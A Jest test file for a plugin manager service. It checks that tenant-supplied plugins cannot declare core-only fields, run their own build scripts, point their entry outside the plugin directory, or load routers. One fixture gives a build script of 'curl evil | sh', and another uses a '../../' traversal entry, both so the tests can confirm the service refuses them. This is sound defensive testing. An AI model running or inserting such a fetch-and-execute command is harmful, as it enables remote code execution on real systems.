import { describe, it, expect, jest, beforeEach, afterEach } from "@jest/globals";
import { promises as fs } from "fs";
import os from "os";
import path from "path";

const execSync = jest.fn();
jest.mock("child_process", () => ({ execSync }));
jest.mock("@server/lib/logger", () => ({
  createLogger: () => ({ debug: jest.fn(), info: jest.fn(), warn: jest.fn(), error: jest.fn() }),
}));
const upsertPlugin = jest.fn<(plugin: unknown) => Promise<unknown>>();
const updateBuildStatus = jest.fn<(...args: unknown[]) => Promise<void>>();
jest.mock("@server/repositories/plugin-registry.repository", () => ({
  pluginRegistryRepository: { upsertPlugin, updateBuildStatus },
}));
jest.mock("@server/repositories/plugin-instance.repository", () => ({
  pluginInstanceRepository: {},
}));
jest.mock("../../services/plugin-runner.service", () => ({
  getPluginRunnerService: () => ({}),
}));
const registerRouter = jest.fn();
jest.mock("../../services/plugin-router-registry.service", () => ({
  pluginRouterRegistry: { hasRouter: () => false, registerRouter },
}));

import { pluginManagerService } from "@server/services/plugin-manager.service";
import type { PluginRegistry } from "@server/entities/plugin-registry.entity";

const pluginsDir = path.join(process.cwd(), "..", "plugins");
let pluginDir: string;

async function writePlugin(
  hayPlugin: Record<string, unknown>,
  extra: Record<string, unknown> = {},
) {
  await fs.writeFile(
    path.join(pluginDir, "package.json"),
    JSON.stringify({
      name: "tenant-plugin",
      "hay-plugin": { entry: "dist/index.js", ...hayPlugin },
      ...extra,
    }),
  );
}

const registryEntry = (sourceType: "core" | "custom" | "git", manifest: Record<string, unknown>) =>
  ({
    id: "row-1",
    pluginId: "tenant-plugin",
    name: "Tenant Plugin",
    pluginPath: path.relative(pluginsDir, pluginDir),
    sourceType,
    organizationId: sourceType === "core" ? undefined : "org-a",
    manifest: { id: "tenant-plugin", ...manifest },
  }) as unknown as PluginRegistry;

beforeEach(async () => {
  jest.clearAllMocks();
  pluginManagerService.registry.clear();
  pluginDir = await fs.mkdtemp(path.join(os.tmpdir(), "plugin-trust-"));
});

afterEach(async () => {
  await fs.rm(pluginDir, { recursive: true, force: true });
});

describe("registerPlugin for organization-supplied plugins", () => {
  it.each([{ trpcRouter: "dist/router.cjs" }, { autoActivate: true }])(
    "rejects a custom manifest declaring %o",
    async (field) => {
      await writePlugin(field);
      await expect(
        pluginManagerService.registerPlugin(pluginDir, "custom", "org-a"),
      ).rejects.toThrow(/only supported for core plugins/);
      expect(upsertPlugin).not.toHaveBeenCalled();
    },
  );

  it("propagates registry conflicts instead of swallowing them", async () => {
    await writePlugin({});
    upsertPlugin.mockRejectedValue(new Error("already registered by another source"));
    await expect(pluginManagerService.registerPlugin(pluginDir, "git", "org-a")).rejects.toThrow(
      /another source/,
    );
    expect(pluginManagerService.registry.has("tenant-plugin")).toBe(false);
  });
});

describe("buildPlugin for organization-supplied plugins", () => {
  it("never runs the plugin's build script and requires the shipped entry", async () => {
    await writePlugin({}, { scripts: { build: "curl evil | sh" } });
    pluginManagerService.registry.set(
      "tenant-plugin",
      registryEntry("custom", { entry: "dist/index.js" }),
    );

    await expect(pluginManagerService.buildPlugin("tenant-plugin")).rejects.toThrow(
      /pre-built entry/,
    );
    expect(execSync).not.toHaveBeenCalled();
    expect(updateBuildStatus).toHaveBeenCalledWith("row-1", false, expect.any(String));
  });

  it("marks a pre-built custom plugin as built without executing anything", async () => {
    await writePlugin({}, { scripts: { build: "tsc" } });
    await fs.mkdir(path.join(pluginDir, "dist"));
    await fs.writeFile(path.join(pluginDir, "dist", "index.js"), "");
    pluginManagerService.registry.set(
      "tenant-plugin",
      registryEntry("git", { entry: "dist/index.js" }),
    );

    await pluginManagerService.buildPlugin("tenant-plugin");

    expect(execSync).not.toHaveBeenCalled();
    expect(updateBuildStatus).toHaveBeenCalledWith("row-1", true, undefined);
  });

  it("rejects an entry outside the plugin directory", async () => {
    pluginManagerService.registry.set(
      "tenant-plugin",
      registryEntry("custom", { entry: "../../server/main.ts" }),
    );
    await expect(pluginManagerService.buildPlugin("tenant-plugin")).rejects.toThrow(
      /pre-built entry/,
    );
  });
});

describe("ensurePluginRouterRegistered", () => {
  it("never loads a router from a non-core plugin", async () => {
    await fs.writeFile(path.join(pluginDir, "router.js"), "throw new Error('loaded');");
    pluginManagerService.registry.set(
      "tenant-plugin",
      registryEntry("custom", { trpcRouter: "router.js", autoActivate: true }),
    );

    await expect(pluginManagerService.ensurePluginRouterRegistered("tenant-plugin")).resolves.toBe(
      false,
    );
    expect(registerRouter).not.toHaveBeenCalled();
  });
});
